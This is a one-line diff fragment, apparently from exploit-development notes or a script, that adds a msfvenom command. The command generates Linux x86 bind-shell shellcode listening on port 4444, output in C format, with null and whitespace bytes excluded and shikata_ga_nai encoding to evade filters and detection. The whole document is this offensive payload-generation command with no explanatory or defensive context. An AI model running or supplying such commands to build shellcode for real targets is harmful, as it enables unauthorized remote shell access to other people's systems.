@@ -1,0 +1,1 @@
+msfvenom -p linux/x86/shell_bind_tcp LPORT=4444 -f c -b "\x00\x0a\x0d\x20" --platform linux -a x86 -e x86/shikata_ga_nai
